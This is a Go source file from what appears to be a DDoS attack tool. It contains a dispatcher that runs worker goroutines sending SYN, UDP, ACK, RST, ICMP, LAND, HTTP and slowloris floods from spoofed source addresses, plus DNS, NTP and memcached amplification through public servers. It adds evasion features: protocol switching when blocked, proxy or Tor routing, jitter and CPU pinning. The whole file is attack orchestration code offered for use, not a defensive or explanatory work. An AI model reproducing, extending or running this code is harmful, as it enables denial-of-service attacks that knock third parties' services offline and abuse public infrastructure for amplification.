package main

import (
	"math/rand"
	"sync/atomic"
	"time"

	"hackit/ddos/internal/ai_scheduler"
	"hackit/ddos/internal/burst_controller"
	"hackit/ddos/internal/protocol_switcher"
)

type Dispatcher struct {
	cfg       *AttackConfig
	status    chan<- WorkerStats
	stop      int32
	rateSched *ai_scheduler.AdaptiveRate
	cpuMgr    *burst_controller.CPUManager
	ifBond    *burst_controller.InterfaceBond
	switchEng *protocol_switcher.SwitchEngine
}

func NewDispatcher(cfg *AttackConfig, status chan<- WorkerStats,
	rateSched *ai_scheduler.AdaptiveRate,
	cpuMgr *burst_controller.CPUManager,
	ifBond *burst_controller.InterfaceBond,
	switchEng *protocol_switcher.SwitchEngine) *Dispatcher {
	return &Dispatcher{
		cfg:       cfg,
		status:    status,
		rateSched: rateSched,
		cpuMgr:    cpuMgr,
		ifBond:    ifBond,
		switchEng: switchEng,
	}
}

func (d *Dispatcher) Stop() {
	atomic.StoreInt32(&d.stop, 1)
}

func (d *Dispatcher) stopped() bool {
	return atomic.LoadInt32(&d.stop) != 0
}

func (d *Dispatcher) currentMethod() string {
	if d.switchEng != nil {
		m := d.switchEng.Current()
		return d.switchEng.MethodName(m)
	}
	return d.cfg.Method
}

func (d *Dispatcher) Run(done chan<- struct{}) {
	method := d.cfg.Method

	if method == "kill" || method == "all" || method == "land" || method == "slowloris" || method == "amp" || method == "mix" {
		ko := NewKillOrchestrator(d.cfg, d.status)
		if method == "all" || method == "mix" {
			d.cfg.MixRatio = "25:25:25:25"
		} else if method == "land" {
			d.cfg.MixRatio = "100:0:0:0"
		} else if method == "slowloris" {
			d.cfg.MixRatio = "0:0:100:0"
		} else if method == "amp" {
			d.cfg.MixRatio = "0:0:0:100"
		}
		ko.Run(done)
		return
	}

	if method == "http" || method == "https" {
		d.runHTTP(done)
		return
	}

	if method == "h2" {
		d.runH2RapidReset(done)
		return
	}

	targetIP := d.cfg.Target
	targetPort := d.cfg.Port
	workers := d.cfg.Workers
	rateLimit := d.cfg.RateLimit

	spoofPool := d.cfg.SpoofPool
	if len(spoofPool) == 0 {
		spoofPool = make([]string, 50)
		for i := range spoofPool {
			spoofPool[i] = randIP()
		}
	}

	spoofU32 := make([]uint32, len(spoofPool))
	for i, s := range spoofPool {
		spoofU32[i] = parseSpoof(s)
	}
	SetSpoofPool(spoofU32)

	err := InitEngine()
	if err != nil {
		errf(`{"type":"error","message":"init engine: %v"}`+"\n", err)
		done <- struct{}{}
		return
	}
	defer CloseEngine()

	if d.cfg.XDPEnable {
		iface := d.cfg.Interfaces
		if len(iface) > 0 {
			errf(`{"type":"xdp","message":"attaching XDP to %s"}`+"\n", iface[0])
		}
	}

	work := make(chan workUnit, workers*10)
	var active int32

	for i := 0; i < workers; i++ {
		w := i
		go func() {
			if d.cpuMgr != nil {
				core, err := d.cpuMgr.AllocateCore()
				if err == nil {
					d.cpuMgr.PinToCore(core)
					defer d.cpuMgr.ReleaseCore(core)
				}
			}
			d.worker(work, targetIP, targetPort, spoofPool, &active)
		}()
		_ = w
	}

	totalSeconds := d.cfg.Duration

	for batch := 0; batch < totalSeconds; batch++ {
		if d.stopped() {
			break
		}

		currentMethod := d.currentMethod()
		currentRate := rateLimit
		if d.rateSched != nil {
			currentRate = d.rateSched.ComputeRate()
		}

		currentIface := ""
		if d.ifBond != nil {
			currentIface = d.ifBond.SelectInterface()
			d.ifBond.MarkActive(currentIface)
		}

		ppw := currentRate / workers
		if ppw < 1 {
			ppw = 1
		}

		for w := 0; w < workers; w++ {
			select {
			case work <- workUnit{count: ppw, method: currentMethod, iface: currentIface}:
			default:
			}
		}

		time.Sleep(1 * time.Second)

		d.status <- WorkerStats{
			Active:    int(atomic.LoadInt32(&active)),
			Rate:      currentRate,
			Method:    currentMethod,
			Interface: currentIface,
		}
	}
	close(work)
	time.Sleep(200 * time.Millisecond)
	done <- struct{}{}
}

type workUnit struct {
	count  int
	method string
	iface  string
}

func (d *Dispatcher) worker(work <-chan workUnit, targetIP string, targetPort int, spoofPool []string, active *int32) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"%v"}`+"\n", r)
		}
	}()

	for wu := range work {
		atomic.AddInt32(active, 1)

		var sent int64
		var errs int64

		spoof := spoofPool[rand.Intn(len(spoofPool))]

		method := wu.method
		if method == "" {
			method = d.cfg.Method
		}

		for i := 0; i < wu.count; i++ {
			if d.stopped() {
				break
			}

			var err error
			switch method {
			case "syn":
				err = SendSYN(targetIP, targetPort, spoof)
			case "udp":
				err = SendUDP(targetIP, targetPort, spoof, 1024)
			case "ack":
				err = SendACK(targetIP, targetPort, spoof)
			case "rst":
				err = SendRST(targetIP, targetPort, spoof)
			case "icmp":
				err = SendICMP(targetIP, spoof)
			case "dns":
				err = SendDNSAmp(targetIP, spoof, "8.8.8.8")
			case "ntp":
				err = SendNTPAmp(targetIP, spoof, "pool.ntp.org")
			case "land":
				err = SendLAND(targetIP, targetPort)
			case "amp":
				err = SendDNSAmp(targetIP, spoof, "8.8.8.8")
				SendNTPAmp(targetIP, spoof, "pool.ntp.org")
				MemcachedAmp(targetIP, spoof, "1.2.3.4")
			case "bypass":
				err = StatefulBypassFlood(targetIP, targetPort, spoof)
			default:
				err = SendUDP(targetIP, targetPort, spoof, 1024)
			}

			if err != nil {
				errs++
				if d.switchEng != nil && d.switchEng.ShouldSwitch() {
					newMethod := d.switchEng.NextMethod()
					method = d.switchEng.MethodName(newMethod)
					errf(`{"type":"switch","from":"%s","to":"%s"}`+"\n",
						d.cfg.Method, method)
				}
			} else {
				sent++
				if d.switchEng != nil {
					d.switchEng.RecordBlock()
				}
			}

			if d.cfg.Jitter > 0 {
				time.Sleep(time.Duration(rand.Intn(d.cfg.Jitter)) * time.Microsecond)
			}
		}

		d.status <- WorkerStats{
			Sent:   sent,
			Errors: errs,
			Method: method,
		}
		atomic.AddInt32(active, -1)
	}
}

func (d *Dispatcher) runHTTP(done chan<- struct{}) {
	flooder := NewHTTPFlooder()
	proxyList := d.cfg.ProxyList
	if len(proxyList) == 0 && d.cfg.TorProxy != "" {
		proxyList = []string{d.cfg.TorProxy}
	}
	go flooder.Run(d.cfg.Target, d.cfg.Port, d.cfg.Workers,
		d.cfg.RateLimit, d.cfg.Duration, proxyList, d.cfg.Jitter, d.status)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	totalSeconds := d.cfg.Duration
	for batch := 0; batch < totalSeconds; batch++ {
		if d.stopped() {
			flooder.Stop()
			break
		}
		<-ticker.C
	}
	done <- struct{}{}
}

func (d *Dispatcher) runH2RapidReset(done chan<- struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"H2 rapid reset panic: %v"}`+"\n", r)
		}
	}()

	streams := d.cfg.H2ConcurrentStreams
	if streams < 1 {
		streams = 100
	}

	spoofPool := d.cfg.SpoofPool
	if len(spoofPool) == 0 {
		spoofPool = make([]string, 50)
		for i := range spoofPool {
			spoofPool[i] = randIP()
		}
	}
	spoofU32 := make([]uint32, len(spoofPool))
	for i, s := range spoofPool {
		spoofU32[i] = parseSpoof(s)
	}
	SetSpoofPool(spoofU32)

	err := InitEngine()
	if err == nil {
		for i := 0; i < d.cfg.Duration; i++ {
			if d.stopped() {
				break
			}
			spoof := d.cfg.SpoofIP
			if spoof == "" && len(d.cfg.SpoofPool) > 0 {
				spoof = d.cfg.SpoofPool[rand.Intn(len(d.cfg.SpoofPool))]
			}
			for s := 0; s < streams; s++ {
				SendSYN(d.cfg.Target, d.cfg.Port, spoof)
			}
			time.Sleep(1 * time.Second)
			d.status <- WorkerStats{
				Active: streams,
				Method: "h2",
			}
		}
		CloseEngine()
	}
	done <- struct{}{}
}
